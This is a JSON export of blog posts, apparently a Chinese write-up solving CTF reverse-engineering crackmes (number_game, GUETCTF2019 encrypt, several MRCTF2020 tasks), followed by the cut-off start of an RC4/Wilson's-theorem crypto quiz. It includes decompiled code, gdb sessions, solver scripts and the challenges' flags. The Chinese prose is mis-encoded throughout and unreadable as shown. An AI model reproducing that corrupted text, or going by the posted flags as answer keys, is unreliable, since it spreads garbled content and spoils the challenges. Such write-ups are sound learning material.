++i ) { for ( j = 0; j \u0026lt;= 4; ++j ) { for ( k = j + 1; k \u0026lt;= 4; ++k ) { if ( *((_BYTE *)\u0026amp;unk_601060 + 5 * i + j) == *((_BYTE *)\u0026amp;unk_601060 + 5 * i + k) ) v1 = 0; if ( *((_BYTE *)\u0026amp;unk_601060 + 5 * j + i) == *((_BYTE *)\u0026amp;unk_601060 + 5 * k + i) ) v1 = 0; } } } è¦æ±‚åœ¨æŸæ¡ä»¶ä¸‹unk_601060ä¸­çš„ä¸¤ä¸ªå­—ç¬¦ä¸ç›¸åŒ\nå†æŸ¥çœ‹ä¸€ä¸‹ä¸­é—´çš„å‡ ä¸ªå‡½æ•°\nå…ˆæŸ¥çœ‹ sub_400881 å‡½æ•°\n__int64 __fastcall sub_400881(char *a1) { __int64 result; // rax byte_601062 = *a1; byte_601067 = a1[1]; byte_601069 = a1[2]; byte_60106B = a1[3]; byte_60106E = a1[4]; byte_60106F = a1[5]; byte_601071 = a1[6]; byte_601072 = a1[7]; byte_601076 = a1[8]; result = (unsigned __int8)a1[9]; byte_601077 = a1[9]; return result; } æ˜¯å°†a1ä¸­çš„æ•°æ®æ”¾åˆ°æŒ‡å®šçš„å†…å­˜ä½ç½®ä¸Š\næŸ¥çœ‹è¿™ä¸ªå†…å­˜åœ°å€\ndata:0000000000601060 unk_601060 db 31h ; 1 .data:0000000000601061 db 34h ; 4 .data:0000000000601062 byte_601062 db 23h ; DATA XREF: sub_400881+Fâ†‘w .data:0000000000601063 db 32h ; 2 .data:0000000000601064 db 33h ; 3 .data:0000000000601065 db 33h ; 3 .data:0000000000601066 db 30h ; 0 .data:0000000000601067 byte_601067 db 23h ; DATA XREF: sub_400881+1Dâ†‘w .data:0000000000601068 db 31h ; 1 .data:0000000000601069 byte_601069 db 23h ; DATA XREF: sub_400881+2Bâ†‘w .data:000000000060106A db 30h ; 0 .data:000000000060106B byte_60106B db 23h ; DATA XREF: sub_400881+39â†‘w .data:000000000060106C db 32h ; 2 .data:000000000060106D db 33h ; 3 .data:000000000060106E byte_60106E db 23h ; DATA XREF: sub_400881+47â†‘w .data:000000000060106F byte_60106F db 23h ; DATA XREF: sub_400881+55â†‘w .data:0000000000601070 db 33h ; 3 .data:0000000000601071 byte_601071 db 23h ; DATA XREF: sub_400881+63â†‘w .data:0000000000601072 byte_601072 db 23h ; DATA XREF: sub_400881+71â†‘w .data:0000000000601073 db 30h ; 0 .data:0000000000601074 db 34h ; 4 .data:0000000000601075 db 32h ; 2 .data:0000000000601076 byte_601076 db 23h ; DATA XREF: sub_400881+7Fâ†‘w .data:0000000000601077 byte_601077 db 23h ; DATA XREF: sub_400881+8Dâ†‘w .data:0000000000601078 db 31h ; 1 å‘ç°ä¸ unk_601060 å¯¹åº”\nè¯´æ˜è¿™ä¸ªç¨‹åºæ˜¯å°†è¾“å…¥æ•°æ®å¡«åˆ°æŒ‡å®šå†…å­˜ä¸Šï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ç¬¦åˆæŸä¸ªç‰¹æ®Šæ¡ä»¶\nç”±äºæ€»å…±æœ‰25ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”ç¨‹åºä¸­å‡ºç°äº†å½¢å¦‚ 5 * i + j çš„å€¼ï¼Œä»¥åŠé¢˜ç›®åç§° number_game æ¨æµ‹æ˜¯ä¸€ç§ç±»ä¼¼æ•°ç‹¬çš„å¡«æ•°æ¸¸æˆï¼Œæ¯è¡Œæ¯åˆ—æ•°å­—åªèƒ½ä¸º01234ä¸”ä¸èƒ½é‡å¤\næŸ¥çœ‹å·²æœ‰çš„æ•°å­—\n14 23 30 1 0 23 3 0 42 1 é‚£ä¹ˆæœ€åv7ä¸­åº”è¯¥ä¸º 0421421430\nç®€å•æŸ¥çœ‹äº† sub_400758 å’Œ sub_400807 åï¼Œç¡®å®šè¿™ä¸¤ä¸ªå‡½æ•°åªè¿›è¡Œäº†é¡ºåºçš„è½¬æ¢ï¼Œåªè¦å¾—çŸ¥å…¶ç»“æœå°±å¯ä»¥\nå› æ­¤ä½¿ç”¨gdbè¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œç›®çš„æ˜¯æ‰¾åˆ°è¿™ä¸¤ä¸ªå‡½æ•°çš„é¡ºåºè°ƒæ¢ç»“æœ\né¦–å…ˆ start è¿è¡Œç¨‹åº\ngdb-peda$ start åœ¨ 0x40a62 å¤„æ‰“ä¸Šæ–­ç‚¹ï¼ˆè¾“å…¥åï¼Œç¬¬ä¸€ä¸ªifå‰ï¼‰\ngdb-peda$ b *0x400a62 è¿è¡Œï¼Œå¹¶è¾“å…¥ 0123456789\næ¥ä¸‹æ¥éœ€è¦ç»•è¿‡ç¬¬ä¸€ä¸ªifåˆ¤æ–­\nåœ¨è°ƒç”¨å‡½æ•°å‰ä¿®æ”¹eipï¼Œç›´æ¥è·³åˆ°jzåé¢\ngdb-peda$ set var $rip=0x400a76 æ¥ä¸‹æ¥éœ€è¦æŸ¥çœ‹ä¸¤ä¸ªå‡½æ•°è¿è¡Œåçš„å€¼ï¼Œè¿™ä¸ªå€¼æ˜¯ sub_400881 çš„å‚æ•°ï¼Œå› æ­¤åœ¨callè¿™ä¸ªå‡½æ•°å‰æ‰“ä¸Šæ–­ç‚¹ï¼Œå¹¶æŸ¥çœ‹ rdi å¯„å­˜å™¨çš„ç»“æœå³å¯\ngdb-peda$ b *0x400aae Breakpoint 3 at 0x400aae gdb-peda$ c Continuing. [----------------------------------registers-----------------------------------] RAX: 0x7ffffffedf40 RBX: 0x400b20 --\u0026gt; 0x41ff894156415741 RCX: 0xe RDX: 0x7ffffffedf40 RSI: 0x7ffffffedf40 RDI: 0x7ffffffedf40 RBP: 0x7ffffffedf60 RSP: 0x7ffffffedf20 RIP: 0x400aae --\u0026gt; 0xb8fffffdcee8 R8 : 0x6033d0 --\u0026gt; 0x36 (\u0026#39;6\u0026#39;) R9 : 0x7c (\u0026#39;|\u0026#39;) R10: 0x4003ce --\u0026gt; 0x5f00636f6c6c616d (\u0026#39;malloc\u0026#39;) R11: 0x7fffff78bbe0 --\u0026gt; 0x6033e0 --\u0026gt; 0x0 R12: 0x4005e0 --\u0026gt; 0x89485ed18949ed31 R13: 0x7ffffffee050 R14: 0x0 R15: 0x0 EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x400aa3: mov BYTE PTR [rbp-0x16],0x0 0x400aa7: lea rax,[rbp-0x20] 0x400aab: mov rdi,rax =\u0026gt; 0x400aae: call 0x400881 0x400ab3: mov eax,0x0 0x400ab8: call 0x400917 0x400abd: test eax,eax 0x400abf: je 0x400afc Guessed arguments: arg[0]: 0x7ffffffedf40 [------------------------------------stack-------------------------------------] Invalid $SP address: 0x7ffffffedf20 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 3, 0x0000000000400aae in ?? () æ³¨æ„åˆ° RDI: 0x7ffffffedf40\nå› æ­¤æŸ¥çœ‹è¿™ä¸ªå†…å­˜åœ°å€ä¸‹çš„å€¼å³å¯\ngdb-peda$ x/2x 0x7ffffffedf40 0x7ffffffedf40: 0x3530343931383337 0x0000000000003632 æ ¹æ®å°ç«¯æ¨¡å¼\n0123456789 è¢«è½¬æ¢ä¸º 7381940526\næ ¹æ®è¿™ä¸ªä¿¡æ¯å°† 0421421430 è¿˜åŸï¼Œå¾—åˆ° 1134240024\nè¿è¡Œç¨‹åº\n$ ./number_game 1134240024 TQL! flag{1134240024} [GUETCTF2019]encrypt æ‹–å…¥idaï¼ŒæŸ¥çœ‹ä¸»å‡½æ•°\nprintf(\u0026#34;please input your flag:\u0026#34;, a2, v19); scanf(\u0026#34;%s\u0026#34;, \u0026amp;s); memset(\u0026amp;v9, 0, 0x408uLL); sub_4006B6(\u0026amp;v9, (__int64)\u0026amp;v10, 8); v3 = strlen(\u0026amp;s); sub_4007DB(\u0026amp;v9, (__int64)\u0026amp;s, v3); v4 = strlen(\u0026amp;s); sub_4008FA((__int64)\u0026amp;s, v4, v19, \u0026amp;v6); for ( i = 0; i \u0026lt;= 50; ++i ) { if ( v19[i] != byte_602080[i] ) { puts(\u0026#34;Wrong\u0026#34;); return 0LL; } } puts(\u0026#34;Good\u0026#34;); åœ¨è¿›è¡Œåˆ¤æ–­å‰æ‰§è¡Œäº†ä¸‰ä¸ªå‡½æ•°\næœ€åä¸€ä¸ªå‡½æ•°æ˜¯ä¸€ä¸ªç±»base64\nwhile ( v20 \u0026lt; a2 ) { v4 = v20++; v17 = *(_BYTE *)(v4 + a1); if ( v20 \u0026gt;= a2 ) { v6 = 0; } else { v5 = v20++; v6 = *(_BYTE *)(v5 + a1); } v18 = v6; if ( v20 \u0026gt;= a2 ) { v8 = 0; } else { v7 = v20++; v8 = *(_BYTE *)(v7 + a1); } v9 = v8; v10 = v19; v11 = v19 + 1; a3[v10] = ((v17 \u0026gt;\u0026gt; 2) \u0026amp; 0x3F) + 61; v12 = v11++; a3[v12] = ((((v18 \u0026amp; 0xFF) \u0026gt;\u0026gt; 4) | 16 * v17) \u0026amp; 0x3F) + 61; a3[v11] = ((((v9 \u0026amp; 0xFF) \u0026gt;\u0026gt; 6) | 4 * v18) \u0026amp; 0x3F) + 61; v13 = v11 + 1; v19 = v11 + 2; a3[v13] = (v9 \u0026amp; 0x3F) + 61; } if ( a2 % 3 == 1 ) { a3[--v19] = 61; } else if ( a2 % 3 != 2 ) { goto LABEL_15; } a3[v19 - 1] = 61; å°†æ¯ä¸€ä½å‡å°‘61åæ˜ å°„åˆ°base64çš„å­—ç¬¦ä¸²ä¸Šå°±å¯ä»¥å¾—åˆ°base64ç»“æœ\nstr = \u0026#39;Z`TzzTrD|fQP[_VVL|yneURyUmFklVJgLasJroZpHRxIUlH\\\\vZE\u0026#39; # æ³¨æ„è½¬ä¹‰å­—ç¬¦ base = \u0026#39;\u0026#39; map = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39; for c in str: base += map[ord(c) - 61] print (base) # base = \u0026#39;djX99X1H/pUTeiZZP/8xoYV8YwJuvZNqPk2N1ydzLV7MYvLf5dI\u0026#39; # æœ€åå†è¡¥å……ä¸€ä¸ª \u0026#39;=\u0026#39; å³å¯ ç ´è§£å®Œè¿™ä¸ªå‡½æ•°åå†æŸ¥çœ‹ä¸Šä¸¤ä¸ªå‡½æ•°\næ ¹æ®è°ƒç”¨åˆ¤æ–­ç¬¬ä¸€ä¸ªå‡½æ•°ä¸ºç¬¬äºŒä¸ªå‡½æ•°æä¾›å¯†é’¥ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯å›ºå®šç»“æœï¼ŒåŠ¨æ€è°ƒè¯•å³å¯å¾—åˆ°\næŸ¥çœ‹ç¬¬äºŒä¸ªå‡½æ•°\nfor ( i = 0; i \u0026lt; a3; ++i ) { v7 = (unsigned __int8)(v7 + 1); v3 = *(_DWORD *)(4LL * v7 + v9); v8 = (unsigned __int8)(v8 + v3); v4 = *(_DWORD *)(4LL * v8 + v9); *(_DWORD *)(v9 + 4LL * v7) = v4; *(_DWORD *)(v9 + 4LL * v8) = v3; *(_BYTE *)(i + a2) ^= *(_BYTE *)(4LL * (unsigned __int8)(v3 + v4) + v9); } è¿™å¯¹è¾“å…¥çš„æ¯ä¸€ä½åšäº†ä¸ªå¼‚æˆ–è¿ç®—ï¼Œå¼‚æˆ–çš„æ•°å­—ä¹Ÿæ˜¯å›ºå®šçš„ï¼Œç›´æ¥è¿›è¡ŒåŠ¨æ€è°ƒè¯•å³å¯ï¼ˆæ ¹æ®ç»éªŒçŒœæµ‹æ˜¯RC4æˆ–è€…ä¸å…¶ç±»ä¼¼ï¼‰\næ ¹æ®base64çš„ä½æ•°å¾—çŸ¥flagæœ€å¤šæœ‰39ä½\nè¿›è¡ŒåŠ¨æ€è°ƒè¯•\ngdb-peda$ start gdb-peda$ c Continuing. please input your flag:flag{abcdefghijklmnopqrstuvwxyz0123456} [----------------------------------registers-----------------------------------] RAX: 0x27 (\u0026#34;\u0026#39;\u0026#34;) RBX: 0x0 RCX: 0x0 RDX: 0x7ffffffed9c0 (\u0026#34;flag{abcdefghijklmnopqrstuvwxyz0123456}\u0026#34;) RSI: 0x7ffffffed9b0 --\u0026gt; 0x4010202030302010 RDI: 0x7ffffffed9e0 --\u0026gt; 0x7d363534333231 (\u0026#39;123456}\u0026#39;) RBP: 0x7ffffffeded0 --\u0026gt; 0x400c80 --\u0026gt; 0x41ff894156415741 RSP: 0x7ffffffed590 --\u0026gt; 0x0 RIP: 0x400bbc --\u0026gt; 0xfffaf08d8d48c289 R8 : 0x0 R9 : 0x0 R10: 0x3 R11: 0x7fffff18ee90 (\u0026lt;__memset_avx2_unaligned_erms\u0026gt;: vmovd xmm0,esi) R12: 0x4005c0 --\u0026gt; 0x89485ed18949ed31 R13: 0x7ffffffedfb0 --\u0026gt; 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x400bad: lea rax,[rbp-0x510] 0x400bb4: mov rdi,rax 0x400bb7: call 0x400550 \u0026lt;strlen@plt\u0026gt; =\u0026gt; 0x400bbc: mov edx,eax 0x400bbe: lea rcx,[rbp-0x510] 0x400bc5: lea rax,[rbp-0x930] 0x400bcc: mov rsi,rcx 0x400bcf: mov rdi,rax [------------------------------------stack-------------------------------------] 0000| 0x7ffffffed590 --\u0026gt; 0x0 0008| 0x7ffffffed598 --\u0026gt; 0x5f4f636d (\u0026#39;mcO_\u0026#39;) 0016| 0x7ffffffed5a0 --\u0026gt; 0x0 0024| 0x7ffffffed5a8 --\u0026gt; 0x31000000b0 0032| 0x7ffffffed5b0 --\u0026gt; 0x7000000075 (\u0026#39;u\u0026#39;) 0040| 0x7ffffffed5b8 --\u0026gt; 0xdf000000f8 0048| 0x7ffffffed5c0 --\u0026gt; 0x3c00000007 0056| 0x7ffffffed5c8 --\u0026gt; 0x7100000078 (\u0026#39;x\u0026#39;) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 2, 0x0000000000400bbc in ?? () gdb-peda$ x/10x $rdx 0x7ffffffed9c0: 0x6362617b67616c66 0x6b6a696867666564 0x7ffffffed9d0: 0x737271706f6e6d6c 0x307a797877767574 0x7ffffffed9e0: 0x007d363534333231 0x0000000000000000 0x7ffffffed9f0: 0x0000000000000000 0x0000000000000000 0x7ffffffeda00: 0x0000000000000000 0x0000000000000000 gdb-peda$ c Continuing. [----------------------------------registers-----------------------------------] RAX: 0x7ffffffed5a0 --\u0026gt; 0x1c00000027 RBX: 0x0 RCX: 0x138 RDX: 0x1c RSI: 0x7d (\u0026#39;}\u0026#39;) RDI: 0x7ffffffed5a0 --\u0026gt; 0x1c00000027 RBP: 0x7ffffffeded0 --\u0026gt; 0x400c80 --\u0026gt; 0x41ff894156415741 RSP: 0x7ffffffed590 --\u0026gt; 0x0 RIP: 0x400bd7 --\u0026gt; 0x48fffffaf0858d48 R8 : 0x0 R9 : 0x0 R10: 0x3 R11: 0x7fffff18ee90 (\u0026lt;__memset_avx2_unaligned_erms\u0026gt;: vmovd xmm0,esi) R12: 0x4005c0 --\u0026gt; 0x89485ed18949ed31 R13: 0x7ffffffedfb0 --\u0026gt; 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x400bcc: mov rsi,rcx 0x400bcf: mov rdi,rax 0x400bd2: call 0x4007db =\u0026gt; 0x400bd7: lea rax,[rbp-0x510] 0x400bde: mov rdi,rax 0x400be1: call 0x400550 \u0026lt;strlen@plt\u0026gt; 0x400be6: mov esi,eax 0x400be8: lea rcx,[rbp-0x93c] [------------------------------------stack-------------------------------------] 0000| 0x7ffffffed590 --\u0026gt; 0x0 0008| 0x7ffffffed598 --\u0026gt; 0x5f4f636d (\u0026#39;mcO_\u0026#39;) 0016| 0x7ffffffed5a0 --\u0026gt; 0x1c00000027 0024| 0x7ffffffed5a8 --\u0026gt; 0x67000000b0 0032| 0x7ffffffed5b0 --\u0026gt; 0x4b000000b8 0040| 0x7ffffffed5b8 --\u0026gt; 0xe000000069 0048| 0x7ffffffed5c0 --\u0026gt; 0x3f000000b9 0056| 0x7ffffffed5c8 --\u0026gt; 0xc5000000ec [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 3, 0x0000000000400bd7 in ?? () gdb-peda$ x/10x 0x7ffffffed9c0 0x7ffffffed9c0: 0xc6ad437df5fd3576 0xa862a26e0d237b16 0x7ffffffed9d0: 0x2c84ae7c0c342488 0x5e656c6895cb5d7c 0x7ffffffed9e0: 0x00e699b5d8f9689b 0x0000000000000000 0x7ffffffed9f0: 0x0000000000000000 0x0000000000000000 0x7ffffffeda00: 0x0000000000000000 0x0000000000000000 å°†è¾“å…¥åœ¨å‡½æ•°æ‰§è¡Œå‰åä¸¤æ¬¡çš„ç»“æœè¿›è¡Œå¼‚æˆ–å³å¯å¾—åˆ°å¼‚æˆ–çš„æ•°å­—ï¼Œå†ä¸base64è§£ç çš„ç»“æœè¿›è¡Œå¼‚æˆ–å³å¯ï¼Œæ³¨æ„å¤§å°ç«¯é—®é¢˜\nfrom libnum import n2s, s2n before = 0x7d363534333231307a797877767574737271706f6e6d6c6b6a6968676665646362617b67616c66 after = 0xe699b5d8f9689b5e656c6895cb5d7c2c84ae7c0c342488a862a26e0d237b16c6ad437df5fd3576 flag = b\u0026#34;v5\\xfd\\xf5}G\\xfe\\x95\\x13z\u0026amp;Y?\\xff1\\xa1\\x85|c\\x02n\\xbd\\x93j\u0026gt;M\\x8d\\xd7\u0026#39;s-^\\xccb\\xf2\\xdf\\xe5\\xd2\u0026#34;[::-1] print (len(flag)) print (n2s(s2n(flag) ^ before ^ after)[::-1]) # b\u0026#39;flag{e10adc3949ba59abbe56e057f20f883e}\\x9b\u0026#39; å¾—åˆ°flag\nflag{e10adc3949ba59abbe56e057f20f883e}\n[MRCTF2020]Transform dword = [ 9, 0xa, 0xf, 0x17, 0x7, 0x18, 0xc, 0x6, 0x1, 0x10, 0x3, 0x11, 0x20, 0x1D, 0x0b, 0x1e, 0x1b, 0x16, 0x4, 0x0d, 0x13, 0x14, 0x15, 0x2, 0x19, 0x5, 0x1f, 0x8, 0x12, 0x1a, 0x1c, 0xe, 0 ] flag = [ 0x67, 0x79, 0x7b, 0x7f, 0x75, 0x2b, 0x3c, 0x52, 0x53, 0x79, 0x57, 0x5E, 0x5D, 0x42, 0x7B, 0x2D, 0x2A, 0x66, 0x42, 0x7E, 0x4C, 0x57, 0x79, 0x41, 0x6B, 0x7E, 0x65, 0x3C, 0x5C, 0x45, 0x6F, 0x62, 0x4D, 0x3f] print(len(dword), len(flag)) for i in range(len(dword)): flag[i] ^= dword[i] code = [ 0 for i in range(33)] for i in range(len(dword)): code[dword[i]] = flag[i] for i in range(len(code)): print(chr(code[i]), end = \u0026#39;\u0026#39;) print() flag: MRCTF{Tr4nsp0sltiON_Clph3r_1s_3z}\n[MRCTF2020]Xor flag = \u0026#39;MSAWB~FXZ:J:`tQJ\u0026#34;N@ bpdd}8g\u0026#39; for i in range(27): print(chr(ord(flag[i]) ^ i), end=\u0026#39;\u0026#39;) print() flag: MRCTF{@_R3@1ly_E2_R3verse!}\n[MRCTF2020]hello_world_go .rodata:00000000004D3C58 unk_4D3C58 db 66h ; f ; DATA XREF: main_main:loc_49A40Aâ†‘o .rodata:00000000004D3C58 ; main_main+25Câ†‘o .rodata:00000000004D3C59 db 6Ch ; l .rodata:00000000004D3C5A db 61h ; a .rodata:00000000004D3C5B db 67h ; g .rodata:00000000004D3C5C db 7Bh ; { .rodata:00000000004D3C5D db 68h ; h .rodata:00000000004D3C5E db 65h ; e .rodata:00000000004D3C5F db 6Ch ; l .rodata:00000000004D3C60 db 6Ch ; l .rodata:00000000004D3C61 db 6Fh ; o .rodata:00000000004D3C62 db 5Fh ; _ .rodata:00000000004D3C63 db 77h ; w .rodata:00000000004D3C64 db 6Fh ; o .rodata:00000000004D3C65 db 72h ; r .rodata:00000000004D3C66 db 6Ch ; l .rodata:00000000004D3C67 db 64h ; d .rodata:00000000004D3C68 db 5Fh ; _ .rodata:00000000004D3C69 db 67h ; g .rodata:00000000004D3C6A db 6Fh ; o .rodata:00000000004D3C6B db 67h ; g .rodata:00000000004D3C6C db 6Fh ; o .rodata:00000000004D3C6D db 67h ; g .rodata:00000000004D3C6E db 6Fh ; o .rodata:00000000004D3C6F db 7Dh ; } [MRCTF2020]PixelShooter å…ˆä½¿ç”¨NoxPlayeræ‰“å¼€è¿™ä¸ªapkï¼Œå‘ç°æ¸¸æˆç»“æŸåæœ‰ä¸ªflagä¿¡æ¯ï¼Œè¯´å¾—åˆ†ä¸å¤Ÿé«˜ï¼Œè¯´æ˜flagä¼šåœ¨æ¸¸æˆç»“æŸæ—¶æ ¹æ®å¾—åˆ†è·å¾—\nä½¿ç”¨apktoolè§£å‹\n$ java -jar apktool_2.5.0.jar d PixelShooter.apk è¿™ä¸ªæ˜¾ç„¶æ˜¯unity3dé€†å‘ï¼Œæ‰¾åˆ° /assets/bin/Data/Managedï¼Œä½¿ç”¨ dnSpyæ‰“å¼€ Assembly-CSharp.dll\nçœ‹åˆ°æœ‰ä¸ªgameControllerï¼Œå…¶ä¸­æœ‰ä¸ªgameOver\npublic void GameOver() { this.isGameOver = true; this.UI.GetComponent\u0026lt;UIController\u0026gt;().GameOver(this.score, this.bestScore); if (PlayerPrefs.HasKey(\u0026#34;bestScore\u0026#34;)) { this.bestScore = Mathf.Max(this.score, PlayerPrefs.GetInt(\u0026#34;bestScore\u0026#34;)); } else { this.bestScore = this.score; } base.GetComponent\u0026lt;AudioSource\u0026gt;().Stop(); } æœ‰ä¸ªè·å–uiçš„å‡½æ•°ï¼ŒæŸ¥çœ‹\npublic void GameOver(int score, int bestScore) { this.pad.SetActive(false); Time.timeScale = 0f; string text = \u0026#34;æ‚¨çš„é£æœºå·²å æ¯\\n\u0026#34;; if (bestScore \u0026lt; score) { string text2 = text; text = string.Concat(new object[] { text2, \u0026#34;è·å¾—æœ€é«˜åˆ†:\u0026#34;, score, \u0026#34;!\\n\u0026#34; }); PlayerPrefs.SetInt(\u0026#34;bestScore\u0026#34;, score); } if (score \u0026lt; 20) { text += \u0026#34;å°‘å¹´ç»§ç»­åŠªåŠ›ï¼è¦æ‹¿åˆ°flagè¿˜å·®äº¿ç‚¹ç‚¹\\n\u0026#34;; } else if (score \u0026lt; 100) { text += \u0026#34;æˆ˜ç»©ä¸é”™ï¼ä½†æ˜¯è¦æ‹¿åˆ°flagè¿˜å·®äº¿ç‚¹\u0026#34;; } else if (score \u0026lt; 500) { text += \u0026#34;æƒŠäººçš„æˆç»©ï¼ï¼ä½†æ˜¯è¦æ‹¿åˆ°flagè¿˜å·®ä¸€ç‚¹\\n\u0026#34;; } else { text += \u0026#34;MRCTF{Unity_1S_Fun_233}\\n\u0026#34;; } if (Time.time - this.lastTime \u0026lt; 15f) { text += \u0026#34;ä»¥åŠï¼Œåˆ«ä½œæ­»å•Šï¼\\n\u0026#34;; } else if (Time.time - this.lastTime \u0026lt; 60f) { text += \u0026#34;ä»¥åŠæ³¨æ„é—ªé¿ï¼\u0026#34;; } this.gameOverText.text = text; this.gameOverUI.SetActive(true); } æ‹¿åˆ°flag\n","date":"2021-01-15T18:29:48Z","image":"/post/reverse-from-0-to-1/cover_hu1385a0e9a9a82b1c72526aa43682148d_1249114_120x120_fill_q75_box_smart1.jpg","permalink":"/post/reverse-from-0-to-1/","title":"Reverse from 0 to 1"},{"content":"Quiz from bzb å‰è¨€\u0026amp;é¢˜ç›® å‰æ®µæ—¶é—´å­¦ä¹ ä¿¡å®‰æ•°åŸºï¼ŒåŠ©æ•™å­¦é•¿å°±é…å¥—å‡ºäº†é“Quizï¼Œæ¥ç»™æˆ‘ä»¬ç»ƒæ‰‹ã€‚\nå…ˆä¸Šé¢˜ç›®\nimport math from AITMCLab.Crypto.Util.number import long_to_bytes from AITMCLab.Crypto.Util.number import bytes_to_long from AITMCLab.Crypto.Util.number import getRandomNBitInteger from AITMCLab.Crypto.Util.number import getPrime from AITMCLab.Crypto.Util.number import isPrime from AITMCLab.Crypto.Util.number import inverse from secret import flag def nextPrime(n): n += 2 if n \u0026amp; 1 else 1 while not isPrime(n): n += 2 return n def init(S, K): j = 0 k = [] K = list(K) for i in range(len(K)): K[i] = ord(K[i]) for i in range(256): S.append(i) k.append(K[i % len(K)]) for i in range(256): j = (j + S[i] + k[i]) % 256 S[i], S[j] = S[j], S[i] def Encrypt(key, D): S=[] init(S, key) i = j = 0 result = \u0026#39;\u0026#39; for a in D: a = ord(a) i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] k = chr(a ^ S[(S[i] + S[j]) % 256]) result += k return result def Decrypt(key, D): S = [] init(S, key) i = j = 0 result = \u0026#39;\u0026#39; for a in D: a = ord(a) i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] k = chr(a ^ S[(S[i] + S[j]) % 256]) result += k return result if __name__ == \u0026#34;__main__\u0026#34;: key = long_to_bytes(getRandomNBitInteger(100)) print \u0026#39;key =\u0026#39;, bytes_to_long(key) e = getPrime(512) print \u0026#39;e =\u0026#39;, e E = nextPrime(e) f = math.factorial(e) % E d = long_to_bytes(f) c1 = bytes_to_long(Encrypt(key, d)) print \u0026#39;c1 =\u0026#39;, c1 c2 = bytes_to_long(Encrypt(key, flag)) print \u0026#39;c2 =\u0026#39;, c2 # e = 11248112333656902878308992204660514716130692202019193081806766887380465145401754698746718075268681481388695805324253817155823465013590321091178897918430457 # c1 = 11792816667683654209610238149228683194178884298019505853565076663183883681365400495420305428570416004628438524072440231323696408946395141935772862600031614 # c2 = 81946333492800053045881242964212560642046177081574600318494251620269838444004879162713842 æ€è·¯ é¦–å…ˆé˜…è¯»ä¸»å‡½æ•°éƒ¨åˆ†ï¼Œæ˜¾ç„¶è¿™é“é¢˜éœ€è¦å…ˆé€šè¿‡e, Eæ±‚è§£fï¼Œä»¥æ­¤å¾—åˆ°dï¼Œéšåå†åˆ©ç”¨d, c1, c2æ¥æ±‚è§£flagã€‚\næ±‚è§£f é¢˜ç›®ä¸­çš„ $f=e!\\mathrm{mod} E$ ï¼Œä½†ç”±äº e è¿‡å¤§ï¼Œæ˜¾ç„¶æ— æ³•ç›´æ¥è®¡ç®—å¾—åˆ°ã€‚è§‚å¯Ÿå‘ç°ï¼Œ$e!$ å½“ä¸­çš„ç»å¤§å¤šæ•°éƒ¨åˆ†å¯ä»¥ä¸¤ä¸¤é…å¯¹ç»„æˆæ¨¡ $E$ çš„é€†å…ƒï¼Œå› æ­¤çŒœæµ‹å¯èƒ½å­˜åœ¨ç±»ä¼¼äº $(E-1)!\\equiv 1\\ (\\mathrm{mod}\\ E)$ çš„è§„å¾‹ï¼Œå¦‚æœæ»¡è¶³è¿™ä¸ªè§„å¾‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è®¡ç®— $\\prod\\limits_{i=e+1}^{E-1}i\\ (\\mathrm{mod}\\ E)$ çš„é€†å…ƒå¾—åˆ°fã€‚\nç»è¿‡å‡ æ¬¡ç®€å•çš„æ£€éªŒï¼ŒçŒœæµ‹è§„å¾‹ä¸º $(E-2)!\\equiv 1\\ (\\mathrm{mod}\\ E)$ ï¼ˆåå¾—çŸ¥ä¸ºWilsonå®šç†ï¼Œå½“æ—¶è¿˜æ²¡å­¦\u0026hellip;ï¼‰ï¼Œå› æ­¤åªéœ€è¦è®¡ç®—$tmp\\equiv \\prod\\limits_{i=e+1}^{E-2}i\\ (\\mathrm{mod}\\ E),\\ f\\cdot tmp\\equiv 1\\ (\\mathrm{mod}\\ E)$ å³å¯å¾—åˆ° $f$ã€‚\næ±‚è§£flag å¾—åˆ°äº† f åï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨ long_to_bytes(f) æ¥å¾—åˆ° d ã€‚ä¸ºæ±‚è§£ flagï¼Œåˆæ­¥è®¾æƒ³ä¸ºåˆ©ç”¨åŠ å¯†å‡½æ•°æ±‚è§£ keyï¼Œéšåç›´æ¥åˆ©ç”¨è§£å¯†å‡½æ•°æ±‚è§£ flagã€‚é˜…è¯» Encrypt å‡½æ•°å’Œ Decrypt å‡½æ•°åå‘ç°åŠ è§£å¯†å‡½æ•°å®Œå…¨ä¸€è‡´ï¼Œä¸”å®é™…çš„åŠ è§£å¯†è¿‡ç¨‹åªæœ‰å¼‚æˆ–è¿ç®—ï¼Œè¯´æ˜ d åˆ° c1 çš„è¿ç®—æ­¥éª¤ä¸ flag åˆ° c2 çš„è¿ç®—æ­¥éª¤å®Œå…¨ç›¸åŒä¸”å¯é€†ï¼Œå› æ­¤æ±‚è§£æ—¶æ²¡å¿…è¦æ±‚å‡º keyã€‚è¿›ä¸€æ­¥åˆ†æåå‘ç°åŠ å¯†ç®—æ³•å¤§è‡´æ˜¯å°† key è½¬åŒ–æˆæŸä¸ªå›ºå®šçš„æ•°ç»„ï¼Œå¹¶ä¸æ˜æ–‡ä¾æ¬¡è¿›è¡Œå¼‚æˆ–è¿ç®—å¾—åˆ°å¯†æ–‡ï¼Œä¹Ÿå°±æ˜¯è¯´ç»è¿‡äº† init å‡½æ•°å’Œå¤šæ¬¡äº¤æ¢ä½ç½®ï¼ˆäº¤æ¢çš„æ¬¡åºä¹Ÿæ˜¯å›ºå®šçš„ï¼‰åçš„æ•°åˆ—æ‰æ˜¯çœŸæ­£çš„å¯†é’¥ã€‚\nå› 